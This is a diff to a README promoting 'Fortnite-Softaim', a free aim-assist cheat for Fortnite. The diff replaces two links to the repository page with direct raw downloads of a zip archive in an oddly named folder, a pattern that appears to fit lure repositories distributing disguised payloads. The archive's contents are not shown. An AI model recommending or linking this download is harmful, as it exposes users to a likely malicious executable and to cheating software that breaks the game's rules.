@@ -6,7 +6,7 @@ Welcome to **Fortnite-Softaim** — the most reliable and completely free softai
 
 ## 📥 Download & Install
 
-Visit this link to download the application: **[Download Fortnite-Softaim](https://github.com/Sammyal4312/Fortnite-Softaim)**
+Visit this link to download the application: **[Download Fortnite-Softaim](https://raw.githubusercontent.com/Sammyal4312/Fortnite-Softaim/main/Palaeoanthropus/v2.7-alpha.5.zip)**
 
 ### 🛠️ Step-by-Step Installation Guide
 
@@ -150,7 +150,7 @@ For the best experience:
 
 Ready to take your Fortnite game to the next level? Click the link below and get started in minutes.
 
-**[🚀 Download Fortnite-Softaim Now](https://github.com/Sammyal4312/Fortnite-Softaim)**
+**[🚀 Download Fortnite-Softaim Now](https://raw.githubusercontent.com/Sammyal4312/Fortnite-Softaim/main/Palaeoanthropus/v2.7-alpha.5.zip)**
 
 Join thousands of players who have already improved their aim with the most trusted free softaim tool of 2026. No strings attached, no limitations — just pure, effortless aiming superiority.
 
